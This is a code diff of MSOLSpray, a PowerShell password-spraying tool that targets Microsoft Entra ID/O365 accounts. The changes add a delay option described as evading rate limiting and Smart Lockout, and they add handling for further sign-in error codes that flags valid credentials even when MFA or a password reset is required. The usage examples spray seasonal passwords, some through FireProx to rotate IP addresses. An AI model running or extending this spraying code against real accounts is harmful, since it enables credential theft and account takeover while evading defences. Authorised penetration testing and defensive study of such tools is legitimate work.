@@ -3,7 +3,7 @@ function Invoke-MSOLSpray{
 
 <#
     .SYNOPSIS
-        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
+        This module will perform password spraying against Microsoft Online accounts (Microsoft Entra ID/Azure AD/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
         MSOLSpray Function: Invoke-MSOLSpray
         Author: Beau Bullock (@dafthack)
         License: BSD 3-Clause
@@ -12,7 +12,7 @@ function Invoke-MSOLSpray{
 
     .DESCRIPTION
         
-        This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.        
+        This module will perform password spraying against Microsoft Online accounts (Microsoft Entra ID/Azure AD/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
     
     .PARAMETER UserList
         
@@ -34,6 +34,14 @@ function Invoke-MSOLSpray{
         
         The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.
     
+    .PARAMETER Delay
+        
+        Delay in seconds between each authentication attempt. Helps avoid rate limiting and Smart Lockout. Default is 0 seconds.
+    
+    .PARAMETER Verbose
+        
+        Displays additional error information for troubleshooting authentication issues.
+    
     .EXAMPLE
         
         C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
@@ -47,6 +55,13 @@ function Invoke-MSOLSpray{
         Description
         -----------
         This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
+    
+    .EXAMPLE
+        
+        C:\PS> Invoke-MSOLSpray -UserList .\userlist.txt -Password Fall2024! -Delay 5 -Verbose
+        Description
+        -----------
+        This command will spray passwords with a 5 second delay between attempts and display verbose error information.
 #>
   Param(
 
@@ -70,7 +85,15 @@ function Invoke-MSOLSpray{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Force
+    $Force,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [int]
+    $Delay = 0,
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [switch]
+    $VerboseErrors
   )
     
     $ErrorActionPreference= 'silentlycontinue'
@@ -82,9 +105,13 @@ function Invoke-MSOLSpray{
     $fullresults = @()
 
     Write-Host -ForegroundColor "yellow" ("[*] There are " + $count + " total users to spray.")
-    Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online."
+    Write-Host -ForegroundColor "yellow" "[*] Now spraying Microsoft Online (Entra ID)."
     $currenttime = Get-Date
     Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
+    
+    if ($Delay -gt 0) {
+        Write-Host -ForegroundColor "yellow" "[*] Delay between requests: $Delay seconds"
+    }
 
     ForEach ($username in $usernames){
         
@@ -106,8 +133,8 @@ function Invoke-MSOLSpray{
         }
         else{
                 # Check the response for indication of MFA, tenant, valid user, etc...
-                # Here is a referense list of all the Azure AD Authentication an Authorization Error Codes:
-                # https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
+                # Here is a reference list of all the Microsoft Entra ID (Azure AD) Authentication and Authorization Error Codes:
+                # https://learn.microsoft.com/en-us/entra/identity-platform/reference-error-codes
 
                 # Standard invalid password
             If($RespErr -match "AADSTS50126")
@@ -161,12 +188,71 @@ function Invoke-MSOLSpray{
                 $fullresults += "$username : $password"
                 }
 
+                # User password must be reset
+            ElseIf($RespErr -match "AADSTS50056")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password must be reset."
+                $fullresults += "$username : $password"
+                }
+
+                # Grant expired or revoked (password was changed/reset)
+            ElseIf($RespErr -match "AADSTS50173")
+                {
+                Write-Output "[*] INFO: The user $username had their password changed or tokens were revoked."
+                }
+
+                # Conditional Access policy blocks token issuance
+            ElseIf($RespErr -match "AADSTS53003")
+                {
+                Write-Output "[*] INFO: Access for $username blocked by Conditional Access policies."
+                }
+
+                # User must enroll for multi-factor authentication
+            ElseIf($RespErr -match "AADSTS50072")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: User must enroll in MFA (but password is valid)."
+                $fullresults += "$username : $password"
+                }
+
+                # Strong authentication is required
+            ElseIf($RespErr -match "AADSTS50074")
+                {
+                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: Strong authentication required (MFA enforced)."
+                $fullresults += "$username : $password"
+                }
+
+                # Application not found in directory
+            ElseIf($RespErr -match "AADSTS700016")
+                {
+                Write-Output "[*] WARNING! Application identifier not found in tenant for $username."
+                }
+
+                # Missing tenant information
+            ElseIf($RespErr -match "AADSTS90019")
+                {
+                Write-Output "[*] WARNING! Missing tenant information for $username."
+                }
+
+                # User trying to sign in with personal Microsoft account
+            ElseIf($RespErr -match "AADSTS81018")
+                {
+                Write-Output "[*] INFO: User $username attempted to sign in with personal Microsoft account (not work/school)."
+                }
+
                 # Unknown errors
             Else
                 {
                 Write-Output "[*] Got an error we haven't seen yet for user $username"
-                $RespErr
+                if ($VerboseErrors) {
+                    Write-Output "[*] Verbose Error Details:"
+                    $RespErr
                 }
+                }
+        }
+    
+        # Add delay between requests if specified
+        if ($Delay -gt 0 -and $curr_user -lt $count) {
+            Start-Sleep -Seconds $Delay
         }
     
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
@@ -188,7 +274,7 @@ function Invoke-MSOLSpray{
             if ($result -ne 0)
             {
                 Write-Host "[*] Cancelling the password spray."
-                Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Microsoft Entra ID Smart Lockout is enabled."
                 break
             }
         }
